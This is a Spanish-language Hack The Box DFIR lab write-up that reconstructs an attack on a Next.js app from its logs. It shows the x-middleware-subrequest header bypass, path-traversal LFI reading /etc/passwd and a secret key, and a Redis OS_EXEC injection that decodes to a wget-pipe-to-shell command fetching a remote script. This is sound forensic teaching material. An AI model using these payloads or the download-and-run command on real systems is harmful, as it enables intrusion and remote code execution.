---
layout: single
title: Sherlock NeuroSync-D - Hack The Box 
excerpt: Anális forense sobre sobre un ataque de LFI en una aplicación escrita en Next.js
date: 2025-4-29
classes: wide
categories: 
   - sherlock-htb
   - DFIR
tags:
   - sysmon
   - evtx

--- 

**Sherlock - NeuroSync-D** 

En este laboratorio estaremos analizando los logs de una aplicación creada con Next.js que fue atacada por un APT(amenaza persistente avanzada).

Se nos proporciona una un .zip que contiene lo siguiente: 

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ ls -l 
total 80
-rw-r----- 1 kali kali 24835 Apr  1 07:42 access.log
-rw-r--r-- 1 kali kali  2617 Apr  1 07:41 bci-device.log
-rw-r--r-- 1 kali kali 27914 Apr  1 07:41 data-api.log
-rw-r--r-- 1 kali kali  8397 Apr  1 07:41 interface.log
-rw-r--r-- 1 kali kali  7209 Apr  1 07:41 redis.log
```

```bash
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ head -n 2 access.log

10.129.231.211 - - [01/Apr/2025:11:37:17 +0000] "GET / HTTP/1.1" 200 8486 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
```

Con esto ya podemos pasar a las preguntas del laboratorio.

---
**task 1** 

¿Qué versión de Next.js utiliza la aplicación?

Para esto podemos usar el siguiente comando: 

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ grep -ni "next.js" *.log
interface.log:5:   ▲ Next.js 15.1.0
interface.log:14:Attention: Next.js now collects completely anonymous telemetry regarding usage.
interface.log:15:This information is used to shape Next.js' roadmap and prioritize features.
                                                                                            
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ head -n 20 interface.log 

> neurosync@0.1.0 dev
> next dev

   ▲ Next.js 15.1.0
   - Local:        http://localhost:3000
   - Network:      http://172.17.0.2:3000
   - Experiments (use with caution):
     · webpackBuildWorker
     · parallelServerCompiles
     · parallelServerBuildTraces

 ✓ Starting...
Attention: Next.js now collects completely anonymous telemetry regarding usage.
This information is used to shape Next.js' roadmap and prioritize features.
You can learn more, including how to opt-out if you'd not like to participate in this anonymous program, by visiting the following URL:
https://nextjs.org/telemetry

 ✓ Ready in 2.2s
 ○ Compiling / ...
                  
```

---
**task 2** 

¿En qué puerto local se ejecuta la aplicación basada en Next.js?

Esto podemos verlo en la parte del log que proporcionamo en la pregunta anterior.

---
**task 3**



Una búsqueda rápida en internet podemos encontrar facilmente que se trata del CVE-2025-29927. 


Este CVE reporta una falla crítica en el manejo que hace Next.js de ciertos requests cuando usa middleware para controlar accesos.
- El problema ocurre porque **Next.js** no valida correctamente algunas peticiones específicas (generalmente manipuladas a nivel de path o cabeceras).
- Esto puede permitir que un atacante **salte** o **evite** mecanismos de **autenticación** (**authentication bypass**) o **autorización** (**authorization bypass**) que estén implementados en el middleware.

**Impacto**:
- Usuarios **no autenticados** podrían acceder a recursos protegidos.
- Usuarios **de menor privilegio** podrían realizar acciones que deberían estar **restringidas**.

Next.js Middleware intercepta peticiones en el server side (antes de que lleguen a las rutas o APIs).  
El fallo se da en **ciertas configuraciones** de middleware donde:
- La lógica de control de acceso **confía demasiado** en los paths o headers sin sanitizar bien.
- Next.js podría interpretar "paths manipulados" como válidos **antes** de que el middleware los revise correctamente.

> Middleware es un código que se ejecuta entre que el usuario hace una solicitud (request) y que el servidor o la aplicación responde (response).
>Es decir:
> Cuando haces una petición, el middleware la intercepta antes de que llegue a su destino final.
> Sirve para Revisar la solicitud (request), validar si el usuario tiene permisos, redirigir a otro lado si no cumple una condición, modificar la solicitud o respuesta (agregar headers, cookies, etc), megistrar logs, analizar tráfico, bloquear ataques.

Ejemplo típico:
- Manipulaciones como `/api/private/../public` o codificaciones raras (`%2e%2e/`) podrían saltarse validaciones ingenuas.

### 📋 Afectados
- Aplicaciones **Next.js 15** (y probablemente también versiones anteriores) que:
  - Usen `middleware.ts`/`middleware.js` para control de acceso.
  - No refuercen las validaciones **después** de resolver correctamente el path o la ruta.

### 🔥 Qué tipo de ataques habilita:
- Entrar a **dashboards administrativos** sin estar logueado.
- Leer datos de **APIs internas** que deberían requerir autenticación.
- Ejecutar acciones privilegiadas como si fueras otro usuario.

### 🛡️ Mitigación / Solución:
- **Actualizar Next.js** a la versión parchada cuando esté disponible.
- **Reforzar manualmente**:
  - Validar rutas después de normalizarlas (`path.normalize`).
  - No confiar en inputs como `req.nextUrl.pathname` tal cual viene.
  - Implementar control de acceso también en el servidor (no solo en middleware).

### 🔎 ¿Cómo se podria explotar?
Si ves un Next.js expuesto:
1. Revisa cómo manejan el middleware (`middleware.ts`, `middleware.js`).
2. Intenta hacer requests manipulados:
   - Rutas que suban (`..`, `%2e%2e/`).
   - Codificaciones raras.
3. Observa si accedes a recursos que deberían estar protegidos.

---
**task 4**

El atacante intentó enumerar algunos archivos estáticos que suelen estar disponibles en el framework Next.js, muy probablemente para recuperar su versión. Cuál es el primer archivo que pudo obtener?

Para esto podemos revisar los logs en `access.log`: 

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ head -n 10 access.log

10.129.231.211 - - [01/Apr/2025:11:37:17 +0000] "GET / HTTP/1.1" 200 8486 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:35 +0000] "GET /_next/static/chunks/framework.js HTTP/1.1" 404 9321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:38 +0000] "GET /_next/static/chunks/main.js HTTP/1.1" 404 9318 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:40 +0000] "GET /_next/static/chunks/commons.js HTTP/1.1" 404 9319 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:44 +0000] "GET /_next/static/chunks/main-app.js HTTP/1.1" 200 1375579 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:47 +0000] "GET /_next/static/chunks/app/page.js HTTP/1.1" 200 64640 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:58 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:59 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:01 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
```

En  Next.js, las rutas estáticas son archivos que ya están pre-generados (no se calculan en tiempo real) y que el servidor entrega directamente al navegador.
Son cosas como:
- Archivos JavaScript (.js) que contienen el código de la app.
- CSS, imágenes, fuentes, íconos, etc.
No son rutas "dinámicas" que corren lógica de servidor o base de datos. Son assets que se sirven tal cual están.

El atacante intentó acceder a estas rutas primero, tal vez no encontró algo interesante, <p style="color: #00ff00;">La primera a la que logró acceder fue a "/_next/static/chunks/main-app.js", pues recibió un código de estado 200.</p>


Esto se puede hacer con herramientas como wfuzz/gobuster, burpsuite, curl, etc. 

---
**task 5**

Entonces el atacante parece haber encontrado un endpoint que está potencialmente afectado por la vulnerabilidad previamente identificada. ¿Cuál es ese endpoint?

Si continuamos analizando los logs, podremos ver que se intentó acceder a la ruta /analytics: 

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ head -n 20 access.log   

10.129.231.211 - - [01/Apr/2025:11:37:17 +0000] "GET / HTTP/1.1" 200 8486 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:35 +0000] "GET /_next/static/chunks/framework.js HTTP/1.1" 404 9321 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:38 +0000] "GET /_next/static/chunks/main.js HTTP/1.1" 404 9318 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:40 +0000] "GET /_next/static/chunks/commons.js HTTP/1.1" 404 9319 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:44 +0000] "GET /_next/static/chunks/main-app.js HTTP/1.1" 200 1375579 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:47 +0000] "GET /_next/static/chunks/app/page.js HTTP/1.1" 200 64640 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:58 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:37:59 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:01 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:02 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:04 +0000] "GET /api/bci/analytics HTTP/1.1" 401 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:05 +0000] "GET /api/bci/analytics HTTP/1.1" 200 737 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:18 +0000] "PUT /api/bci/analytics HTTP/1.1" 200 91 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:18 +0000] "GET /api/bci/analytics HTTP/1.1" 500 143 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:19 +0000] "PUT /api/bci/analytics HTTP/1.1" 200 93 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:19 +0000] "GET /api/bci/analytics HTTP/1.1" 500 145 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:21 +0000] "PUT /api/bci/analytics HTTP/1.1" 200 129 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:21 +0000] "GET /api/bci/analytics HTTP/1.1" 400 66 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
10.129.231.211 - - [01/Apr/2025:11:38:26 +0000] "PUT /api/bci/analytics HTTP/1.1" 200 90 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
```

Podemos ver que se intentó acceder varias veces a <p style="color: #00ff00;">/api/bci/analytics</p> con un código de error 401(indica que la solicitud web necesita autenticación para ser procesada), hasta que obtuvo un código 200. ya el propio nombre del recurso nos indica que puede ser una ruta crítica. 

Esto podemos confirmarlo en **interface.log**

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ head -n 50 interface.log
 <SNIP>
2025-04-01T11:37:58.163Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-real-ip","10.129.231.211"]]
```

---
**task 6** 

¿Cuántas solicitudes a este punto final han dado como resultado una respuesta "No autorizado"?

Esto podemos contarlo de la siguiente forma, contando las veces que se obtiene un código <p style="color: #00ff00;">401</p>

```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ grep "401" access.log | wc -l 
5
```

---
**task 7**

¿Cuándo se recibe una respuesta satisfactoria del endpoint vulnerable, lo que significa que se ha eludido el middleware?

Esto podemos obtenerlo de la línea en la que se observa el acceso al "/api/bci/analytics"

```txt
10.129.231.211 - - [01/Apr/2025:11:38:05 +0000] "GET /api/bci/analytics HTTP/1.1" 200 737 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
```

En el formato que piden en el laboratorio <p style="color: #00ff00;">2025-04-01 11:38:05<p>


---
**task 8**



Explicando brevemente el CVE expuesto en preguntas anteriores: 

En Next.js, el middleware depende de cabeceras internas como x-middleware-subrequest para controlar qué requests ya pasaron por el middleware y cuáles no.
- Si una cabecera x-middleware-subrequest ya existe y el valor es el esperado (o un valor mal interpretado), el servidor confía en ella.
- Es decir: no vuelve a aplicar las reglas de autenticación/autorización de nuevo para esa petición.
- Entonces, si tú inyectas tu propia cabecera manipulada, puedes hacerle creer al servidor que la petición ya pasó por el middleware, aunque no sea cierto.


Revisando a fondo los logs en `interface.log`

```bash 
2025-04-01T11:37:58.163Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-real-ip","10.129.231.211"]]
2025-04-01T11:37:59.699Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware"],["x-real-ip","10.129.231.211"]]
2025-04-01T11:38:01.280Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware:middleware"],["x-real-ip","10.129.231.211"]]
2025-04-01T11:38:02.486Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware:middleware:middleware"],["x-real-ip","10.129.231.211"]]
2025-04-01T11:38:04.111Z - 10.129.231.211 - GET - http://localhost:3000/api/bci/analytics - [["accept","*/*"],["accept-encoding","gzip, deflate, br"],["connection","close"],["host","10.129.231.215"],["user-agent","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"],["x-forwarded-for","10.129.231.211"],["x-forwarded-host","10.129.231.215"],["x-forwarded-port","3000"],["x-forwarded-proto","http"],["x-middleware-subrequest","middleware:middleware:middleware:middleware"],["x-real-ip","10.129.231.211"]]
 ✓ Compiled /api/bci/analytics in 250ms (606 modules)
 GET /api/bci/analytics 200 in 412ms
 PUT /api/bci/analytics 200 in 17ms
```

Vemos que el atacante empezó a manipular la cabacera "x-middleware-subrequest","middleware" primero con un valor, después con 2("x-middleware-subrequest","middleware:middleware") hasta que logró acceder. La ultima petición que se lanzó había un patrón con 4 palabras con "middleware"(middleware:middleware:middleware:middleware) por lo que podemos concluir que que con 5 palabras de esta fue que logró bypassear el middleware: 



<p style="color: #00ff00;">x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware</p>


---
**task 9** 

El atacante encadenó la vulnerabilidad con un ataque SSRF, lo que le permitió realizar un escaneo interno de puertos y descubrir una API interna. ¿En qué puerto es accesible la API?

Un **SSRF (Server-Side Request Forgery)** es una vulnerabilidad que permite a un atacante **hacer que el servidor haga solicitudes HTTP por sí mismo**, normalmente a direcciones **internas o protegidas** que el atacante **no debería poder alcanzar directamente**.

Imaginenmos que tenemos una app web donde se puede ingresar a una URL para que el servidor la "visite" y muestre el contenido (por ejemplo, una función de "verificación de enlaces").

Un atacante pone una URL maliciosa como:

```
http://localhost:8000/admin
```

El servidor, confiado, **hace esa petición desde dentro de su red**. Así, el atacante:

- Puede acceder a **servicios internos** (base de datos, Redis, API interna, etc.).
- Puede robar metadatos de servicios en la nube (por ejemplo, AWS: `http://169.254.169.254/latest/meta-data/`).
- Puede **escanear puertos internos**.
- A veces, incluso **ejecutar código** o **bypassear firewalls**.

Formulario vulnerable:

```http
POST /fetch-url
Host: vulnerable.com

url=http://localhost:8000/admin
```

El servidor hace internamente:

```bash
curl http://localhost:8000/admin
```
- Permite a atacantes **pivotar dentro de la red interna**.
- Puede revelar información confidencial (tokens, configuraciones, puertos abiertos).
- Puede usarse como primer paso en una **escalada lateral o vertical** dentro de una infraestructura.

Por eso se recomienda:
- Validar y filtrar URLs de entrada (no permitir IPs locales como `127.0.0.1`, `localhost`, `169.254.x.x`, etc.).
- Hacer resoluciones DNS controladas.
- Usar listas blancas (whitelist) estrictas de dominios confiables.
- Desactivar peticiones innecesarias del servidor hacia el exterior.

Sabiendo que es un SSRF, ya podemos buscar entre los logs, el primer que revisamos el `data-api.log`, y podemos observar que en el primer log se registra el acceso al panel de **`analytics`**


```bash 
┌──(kali㉿kali)-[~/blue-labs/DFIR/neurosync]
└─$ head -n 10 data-api.log

> data-api@1.0.0 start
> node .

2025-04-01 11:35:09 [VERBOSE] External analytics server is running on port 4000
2025-04-01 11:35:09 [VERBOSE] Starting commands migration...
2025-04-01 11:35:09 [VERBOSE] Pushing command: MOVE_UP with payload: 
2025-04-01 11:35:09 [VERBOSE] Command MOVE_UP pushed successfully.
2025-04-01 11:35:09 [VERBOSE] Pushing command: MOVE_DOWN with payload: 
2025-04-01 11:35:09 [VERBOSE] Command MOVE_DOWN pushed successfully.
```

---
**task 10**

Tras el escaneo de puertos, el atacante inicia un ataque de fuerza bruta para encontrar algunos endpoints vulnerables en la API previamente identificada. ¿Qué endpoint vulnerable se ha encontrado?


Si seguimos explorando los logs, podremos ver lo siguiente:

```bash 
219 2025-04-01 11:38:50 [VERBOSE] Incoming request: GET /reports from ::ffff:127.0.0.1
220 2025-04-01 11:38:50 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
221 2025-04-01 11:38:51 [VERBOSE] Incoming request: GET /metrics from ::ffff:127.0.0.1
222 2025-04-01 11:38:51 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
223 2025-04-01 11:38:51 [VERBOSE] Incoming request: GET /version from ::ffff:127.0.0.1
224 2025-04-01 11:38:51 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
225 2025-04-01 11:38:52 [VERBOSE] Incoming request: GET /docs from ::ffff:127.0.0.1
226 2025-04-01 11:38:52 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
```

El atacante intetó leer otras rutas de la web, ya que probrablemente /analytics no es un endopint vulnerable ni que guarde infromación relevante, así que continuó con el ataque hasta que encuentra que la ruta <p style="color: #00ff00;">/logs</p> es vulnerable a un `Local File Inclusion (LFI)`, una vulnerabilidad web que permite a un atacante incluir y leer archivos locales del servidor a través de parámetros manipulables en una URL.

```bash
227 2025-04-01 11:38:52 [VERBOSE] Incoming request: GET /logs from ::ffff:127.0.0.1
228 2025-04-01 11:38:52 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
229 2025-04-01 11:38:52 [VERBOSE] Received GET /logs request from ::ffff:127.0.0.1
230 2025-04-01 11:38:52 [VERBOSE] Requested log file: /var/log/logfile.txt
231 2025-04-01 11:38:52 [VERBOSE] Sanitized log file path: /var/log/logfile.txt
232 2025-04-01 11:38:52 [VERBOSE] Reading log file: /var/log/logfile.txt
233 2025-04-01 11:38:52 [VERBOSE] Log file read successfully.
234 2025-04-01 11:38:52 [VERBOSE] Log file contains 3 lines.
235 2025-04-01 11:38:52 [VERBOSE] Parsed 2 valid log entries.
236 2025-04-01 11:38:52 [VERBOSE] Sending log data response...
237 2025-04-01 11:39:01 [VERBOSE] Incoming request: GET /logs?logFile=/var/log/../.../...//../.../...//etc/passwd from ::ffff:127.0.0.1
238 2025-04-01 11:39:01 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
239 2025-04-01 11:39:01 [VERBOSE] Received GET /logs request from ::ffff:127.0.0.1
240 2025-04-01 11:39:01 [VERBOSE] Requested log file: /var/log/../.../...//../.../...//etc/passwd
241 2025-04-01 11:39:01 [VERBOSE] Sanitized log file path: /var/log/../../etc/passwd
242 2025-04-01 11:39:01 [VERBOSE] Reading log file: /var/log/../../etc/passwd
243 2025-04-01 11:39:01 [VERBOSE] Log file read successfully.
244 2025-04-01 11:39:01 [VERBOSE] Log file contains 20 lines.
```

--- 
**task 11** 

¿Cuándo se utilizó maliciosamente por primera vez el endpoint vulnerable encontrado?

Bien, nos piden la primera vez que se usa para intenciones maliciosas, y podemos ver que el primer log en el que se intenta leer el fichero `/etc/passwd` es elsiguiente: 

```bash
365 237 2025-04-01 11:39:01 [VERBOSE] Incoming request: GET /logs?logFile=/var/log/../.../...//../.../...//etc/passwd from ::ffff:127.0.0.1
```

---
**task 12** 

¿Cuál es el nombre del ataque al que es vulnerable el endpoint?

Como ya vimos, posible pasar un parámetro a la URL del sitio, y el valor que le pasemos puede ser algun fichero interno del servidor, a esto se le conoce como <p style="color: #00ff00;" Local File Inclusion(LFI)</p>

---
**task 13**

¿Cuál es el nombre del archivo que se atacó la última vez que se explotó el punto vulnerable?

Esto lo podemos encontrar identificando la última vez que se ejecutó el LFI: 

```bash
279 2025-04-01 11:39:24 [VERBOSE] Incoming request: GET /logs?logFile=/var/log/../.../...//../.../...//tmp/secret.key from ::ffff:127.0.0.1
280 2025-04-01 11:39:24 [VERBOSE] Request headers: {"host":"127.0.0.1:4000","user-agent":"curl/7.88.1","accept":"*/*"}
281 2025-04-01 11:39:24 [VERBOSE] Received GET /logs request from ::ffff:127.0.0.1
282 2025-04-01 11:39:24 [VERBOSE] Requested log file: /var/log/../.../...//../.../...//tmp/secret.key
283 2025-04-01 11:39:24 [VERBOSE] Sanitized log file path: /var/log/../../tmp/secret.key
284 2025-04-01 11:39:24 [VERBOSE] Reading log file: /var/log/../../tmp/secret.key
285 2025-04-01 11:39:24 [VERBOSE] Log file read successfully.
286 2025-04-01 11:39:24 [VERBOSE] Log file contains 1 lines.
```

---
**task 14**

Por último, el atacante utiliza la información sensible obtenida anteriormente para crear un comando especial que le permite realizar la inyección Redis y obtener RCE en el sistema. ¿Cuál es la cadena de comandos?

Ahora revisemos el registro de `redis.log`


```bash 
42 1743507485.832728 [0 127.0.0.1:43100] "rpush" "analyticsLogs" "{\"timestamp\":\"2025-04-01T11:38:05.832Z\",\"ip\":\"::ffff:127.0.0.1\",\"route\":\"/analytics\"}"
 43 1743507489.696978 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_UP|"
 44 1743507489.697963 [0 [::1]:41164] "blpop" "bci_commands" "0"
 45 1743507489.698587 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_DOWN|"
 46 1743507489.698889 [0 [::1]:41164] "blpop" "bci_commands" "0"
 47 1743507489.699463 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_LEFT|"
 48 1743507489.700000 [0 [::1]:41164] "blpop" "bci_commands" "0"
 49 1743507489.700483 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_RIGHT|"
 50 1743507489.700707 [0 [::1]:41164] "blpop" "bci_commands" "0"
 51 1743507519.697100 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_UP|"
 52 1743507519.697863 [0 [::1]:41164] "blpop" "bci_commands" "0"
 53 1743507519.698072 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_DOWN|"
 54 1743507519.698328 [0 [::1]:41164] "blpop" "bci_commands" "0"
 55 1743507519.698602 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_LEFT|"
 56 1743507519.698825 [0 [::1]:41164] "blpop" "bci_commands" "0"
 57 1743507519.699415 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_RIGHT|"
 58 1743507519.700043 [0 [::1]:41164] "blpop" "bci_commands" "0"
 59 1743507530.492892 [0 127.0.0.1:43100] "rpush" "analyticsLogs" "{\"timestamp\":\"2025-04-01T11:38:50.492Z\",\"ip\":\"::ffff:127.0.0.1\",\"route\":\"/analytics\"}"
 60 1743507549.699232 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_UP|"
 61 1743507549.700227 [0 [::1]:41164] "blpop" "bci_commands" "0"
 62 1743507549.701175 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_DOWN|"
 63 1743507549.701481 [0 [::1]:41164] "blpop" "bci_commands" "0"
 64 1743507549.701957 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_LEFT|"
 65 1743507549.702223 [0 [::1]:41164] "blpop" "bci_commands" "0"
 66 1743507549.702572 [0 127.0.0.1:43100] "rpush" "bci_commands" "MOVE_RIGHT|"
 67 1743507549.702797 [0 [::1]:41164] "blpop" "bci_commands" "0"
 68 1743507558.556141 [0 127.0.0.1:45958] "PING"
 69 1743507561.220381 [0 127.0.0.1:45972] "KEYS" "*"
 70 1743507562.237012 [0 127.0.0.1:45982] "SET" "test" "test"
 71 1743507566.415465 [0 127.0.0.1:34502] "RPUSH" "bci_commands" "OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad707    3e3a448fa13bbb"
```

Se ve que el atacante lanzó un ping a lo que podría ser un intento del atacante para comunicarse con lainstancia de redis, depués ya vemos un comando que parece estar encodeado.

<p style="#00ff00">OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb</p>

---
**task 15**

Una vez descodificado, ¿cuál es el comando?

Para esto revisamos los logs del dispositivo BCI, y encontramos lo siguiente: 


```bash 
38 2025-04-01 11:39:26 BCI (Device): Executing OS command: wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
 39 2025-04-01 11:39:26 BCI (Device): Command output: sh: 1: wget: not found
```
